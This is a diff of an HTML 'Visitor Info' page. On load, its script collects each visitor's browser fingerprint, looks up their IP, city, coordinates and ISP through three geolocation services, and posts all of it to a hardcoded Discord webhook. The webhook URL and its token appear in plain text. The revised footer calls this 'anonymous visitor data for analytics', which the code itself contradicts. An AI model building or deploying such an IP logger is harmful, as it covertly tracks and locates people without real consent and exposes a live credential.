@@ -6,142 +6,198 @@
     <title>Visitor Info</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background: #1e1e2f;
-            color: #fff;
+            background: #0d1117;
+            color: #c9d1d9;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
-            flex-direction: column;
+            padding: 20px;
         }
         .card {
-            background: #2a2a40;
+            background: #161b22;
+            border-radius: 8px;
             padding: 2rem;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-            max-width: 500px;
-            text-align: center;
+            max-width: 600px;
+            width: 100%;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+        }
+        h1 {
+            margin-top: 0;
+            color: #58a6ff;
         }
         .status {
-            color: #aaf0e9;
-            margin-bottom: 1rem;
+            padding: 12px;
+            border-radius: 6px;
+            margin: 20px 0;
+            background: #1f2937;
+            border-left: 4px solid #58a6ff;
         }
+        .details {
+            background: #0d1117;
+            padding: 15px;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            word-break: break-word;
+            border: 1px solid #30363d;
+        }
+        .success { border-left-color: #3fb950; }
+        .error { border-left-color: #f85149; }
         .small {
             font-size: 0.8rem;
-            color: #aaa;
-            margin-top: 2rem;
+            color: #8b949e;
+            margin-top: 20px;
+        }
+        button {
+            background: #238636;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 1rem;
+            margin-top: 15px;
+        }
+        button:hover {
+            background: #2ea043;
         }
     </style>
 </head>
 <body>
     <div class="card">
-        <h1>👋 Hello visitor</h1>
-        <div class="status" id="status">Gathering your information...</div>
-        <div id="details" style="text-align: left; font-size: 0.9rem;"></div>
-        <div class="small">We've sent a report to the site owner.</div>
+        <h1>🌍 Visitor Info</h1>
+        <div class="status" id="status">Initializing...</div>
+        <div class="details" id="details"></div>
+        <button id="copyBtn" style="display:none;">Copy Details</button>
+        <div class="small">This page collects anonymous visitor data for analytics.</div>
     </div>
 
     <script>
         (function() {
+            // ----- CONFIGURATION -----
+            const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1482493568831717648/84IzzIBPsGlJfCEZjVCg-qok8J71R61VoyXKPxFi9AvXRrmKmG_NajRyTJyJlM2Tukpf';
+            
+            // Get a free token from ipinfo.io to increase reliability (optional but recommended)
+            const IPINFO_TOKEN = ''; // Leave empty if you don't have one, but it may still work (rate-limited)
+
+            // ----- ELEMENTS -----
             const statusEl = document.getElementById('status');
             const detailsEl = document.getElementById('details');
-            const webhookURL = 'https://discord.com/api/webhooks/1482493568831717648/84IzzIBPsGlJfCEZjVCg-qok8J71R61VoyXKPxFi9AvXRrmKmG_NajRyTJyJlM2Tukpf';
+            const copyBtn = document.getElementById('copyBtn');
 
-            // Collect browser info
-            const browserInfo = {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'unspecified'
-            };
+            // ----- HELPER FUNCTIONS -----
+            function setStatus(text, isError = false) {
+                statusEl.textContent = text;
+                statusEl.className = 'status ' + (isError ? 'error' : '');
+            }
 
-            // Display browser info on page
-            detailsEl.innerHTML = `<strong>Browser:</strong> ${browserInfo.userAgent.substr(0, 60)}...<br>
-                                   <strong>Screen:</strong> ${browserInfo.screen}<br>
-                                   <strong>Language:</strong> ${browserInfo.language}<br>
-                                   <strong>Platform:</strong> ${browserInfo.platform}<br>
-                                   <strong>Timezone:</strong> ${browserInfo.timezone}`;
+            function displayDetails(data) {
+                let html = '';
+                for (let [key, value] of Object.entries(data)) {
+                    html += `<strong>${key}:</strong> ${value}<br>`;
+                }
+                detailsEl.innerHTML = html;
+                copyBtn.style.display = 'inline-block';
+            }
 
-            // Function to send to Discord
             function sendToDiscord(content) {
-                fetch(webhookURL, {
+                fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ content: content })
-                }).catch(e => console.error('Discord send failed:', e));
+                })
+                .then(response => {
+                    if (!response.ok) console.warn('Discord webhook returned', response.status);
+                    else console.log('Discord notification sent');
+                })
+                .catch(e => console.error('Failed to send to Discord:', e));
             }
 
-            // Try multiple IP APIs in order
-            const ipApis = [
+            // Collect browser info
+            const browserInfo = {
+                'User Agent': navigator.userAgent,
+                'Language': navigator.language,
+                'Platform': navigator.platform,
+                'Screen': `${screen.width}x${screen.height}`,
+                'Color Depth': screen.colorDepth + '-bit',
+                'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
+                'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
+                'Do Not Track': navigator.doNotTrack || 'Not set'
+            };
+
+            // Display browser info immediately
+            displayDetails(browserInfo);
+            setStatus('Fetching IP and location...');
+
+            // ----- IP GEOLOCATION APIS (tried in order) -----
+            const apis = [
+                // 1. ipapi.co (reliable, no token required, rate-limited but usually fine)
                 {
                     url: 'https://ipapi.co/json/',
                     parse: (data) => ({
                         ip: data.ip,
-                        city: data.city,
-                        region: data.region,
-                        country: data.country_name,
-                        loc: `${data.latitude},${data.longitude}`,
-                        org: data.org,
-                        timezone: data.timezone
-                    })
+                        location: `${data.city || '?'}, ${data.region || '?'}, ${data.country_name || '?'}`,
+                        coordinates: data.latitude && data.longitude ? `${data.latitude}, ${data.longitude}` : '?',
+                        isp: data.org || 'N/A',
+                        timezone: data.timezone || 'N/A'
+                    }),
+                    errorMessage: 'ipapi.co failed'
                 },
+                // 2. ipinfo.io (requires token for best results, but works without token with limits)
                 {
-                    url: 'https://ipinfo.io/json?token=YOUR_TOKEN',  // ipinfo.io requires a free token for extended data; without token it gives limited info but still IP and location roughly.
+                    url: IPINFO_TOKEN ? `https://ipinfo.io/json?token=${IPINFO_TOKEN}` : 'https://ipinfo.io/json',
                     parse: (data) => ({
                         ip: data.ip,
-                        city: data.city,
-                        region: data.region,
-                        country: data.country,
-                        loc: data.loc,
-                        org: data.org,
-                        timezone: data.timezone
+                        location: `${data.city || '?'}, ${data.region || '?'}, ${data.country || '?'}`,
+                        coordinates: data.loc || '?',
+                        isp: data.org || 'N/A',
+                        timezone: data.timezone || 'N/A'
                     }),
-                    // Note: ipinfo.io without token still returns city/region/country but may be less accurate; it's free but limited requests.
-                    // For production, get a free token from ipinfo.io and replace 'YOUR_TOKEN'
+                    errorMessage: 'ipinfo.io failed'
                 },
+                // 3. ip-api.com (HTTP only, but works on HTTPS if the browser allows mixed content; often reliable)
                 {
-                    url: 'http://ip-api.com/json/',  // note: http, not https; but ip-api.com supports https if you pay. For free, http is fine, but may be blocked on https sites.
+                    url: 'http://ip-api.com/json/', // note: http
                     parse: (data) => ({
                         ip: data.query,
-                        city: data.city,
-                        region: data.regionName,
-                        country: data.country,
-                        loc: `${data.lat},${data.lon}`,
-                        org: data.isp,
-                        timezone: data.timezone
-                    })
+                        location: `${data.city || '?'}, ${data.regionName || '?'}, ${data.country || '?'}`,
+                        coordinates: data.lat && data.lon ? `${data.lat}, ${data.lon}` : '?',
+                        isp: data.isp || 'N/A',
+                        timezone: data.timezone || 'N/A'
+                    }),
+                    errorMessage: 'ip-api.com failed'
                 }
             ];
 
-            // Try APIs one by one
+            // Try APIs sequentially
             function tryApi(index) {
-                if (index >= ipApis.length) {
-                    // All APIs failed
-                    statusEl.innerText = 'Could not retrieve full location.';
-                    const fallbackMsg = `🆕 **New Visitor (Limited Data)**\n` +
-                        `**Browser:** ${browserInfo.userAgent}\n` +
-                        `**Screen:** ${browserInfo.screen}\n` +
-                        `**Language:** ${browserInfo.language}\n` +
-                        `**Platform:** ${browserInfo.platform}\n` +
-                        `**Timezone:** ${browserInfo.timezone}\n` +
-                        `**Note:** IP geolocation unavailable.`;
+                if (index >= apis.length) {
+                    // All APIs failed – send browser info only
+                    setStatus('Could not retrieve full location. Sending browser info only.', true);
+                    const fallbackMsg = `🆕 **New Visitor (Limited)**\n` +
+                        Object.entries(browserInfo).map(([k, v]) => `**${k}:** ${v}`).join('\n') +
+                        `\n**Note:** IP geolocation unavailable.`;
                     sendToDiscord(fallbackMsg);
                     return;
                 }
 
-                const api = ipApis[index];
-                statusEl.innerText = `Trying to locate you (${index+1}/${ipApis.length})...`;
-                
-                fetch(api.url, { mode: 'cors' })
-                    .then(res => res.json())
+                const api = apis[index];
+                setStatus(`Trying ${api.url}...`);
+
+                // Use a timeout to avoid hanging
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 second timeout
+
+                fetch(api.url, { signal: controller.signal, mode: 'cors' })
+                    .then(response => {
+                        clearTimeout(timeoutId);
+                        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                        return response.json();
+                    })
                     .then(data => {
-                        console.log(`API ${index} response:`, data);
+                        console.log(`Response from ${api.url}:`, data);
                         let parsed;
                         try {
                             parsed = api.parse(data);
@@ -150,34 +206,39 @@
                         }
                         if (!parsed.ip) throw new Error('No IP in response');
 
-                        // Success - build message
-                        const msg = `🆕 **New Visitor**\n` +
+                        // Success – build message
+                        const ipLocationMsg = `🆕 **New Visitor**\n` +
                             `**IP:** ${parsed.ip}\n` +
-                            `**Location:** ${parsed.city || '?'}, ${parsed.region || '?'}, ${parsed.country || '?'}\n` +
-                            `**Coordinates:** ${parsed.loc || '?'}\n` +
-                            `**ISP:** ${parsed.org || 'N/A'}\n` +
-                            `**Timezone:** ${parsed.timezone || browserInfo.timezone}\n` +
-                            `**Browser:** ${browserInfo.userAgent}\n` +
-                            `**Screen:** ${browserInfo.screen}\n` +
-                            `**Language:** ${browserInfo.language}\n` +
-                            `**Platform:** ${browserInfo.platform}\n` +
-                            `**Cookies Enabled:** ${browserInfo.cookiesEnabled}\n` +
-                            `**Do Not Track:** ${browserInfo.doNotTrack}`;
+                            `**Location:** ${parsed.location}\n` +
+                            `**Coordinates:** ${parsed.coordinates}\n` +
+                            `**ISP:** ${parsed.isp}\n` +
+                            `**Timezone:** ${parsed.timezone}\n` +
+                            Object.entries(browserInfo).map(([k, v]) => `**${k}:** ${v}`).join('\n');
 
-                        sendToDiscord(msg);
-                        statusEl.innerText = 'Information sent!';
-                        detailsEl.innerHTML = `<strong>IP:</strong> ${parsed.ip}<br>
-                                               <strong>Location:</strong> ${parsed.city}, ${parsed.region}, ${parsed.country}<br>
-                                               ${detailsEl.innerHTML}`;
+                        sendToDiscord(ipLocationMsg);
+
+                        // Update page with full info
+                        const fullInfo = { ...browserInfo, ...parsed };
+                        displayDetails(fullInfo);
+                        setStatus('✅ Information sent to site owner!');
                     })
-                    .catch(err => {
-                        console.warn(`API ${index} failed:`, err);
-                        tryApi(index + 1); // try next
+                    .catch(error => {
+                        clearTimeout(timeoutId);
+                        console.warn(api.errorMessage, error);
+                        tryApi(index + 1); // try next API
                     });
             }
 
             // Start trying
             tryApi(0);
+
+            // Copy button functionality (optional)
+            copyBtn.addEventListener('click', () => {
+                const text = Object.entries(browserInfo).map(([k, v]) => `${k}: ${v}`).join('\n');
+                navigator.clipboard.writeText(text).then(() => {
+                    alert('Details copied to clipboard');
+                });
+            });
         })();
     </script>
 </body>
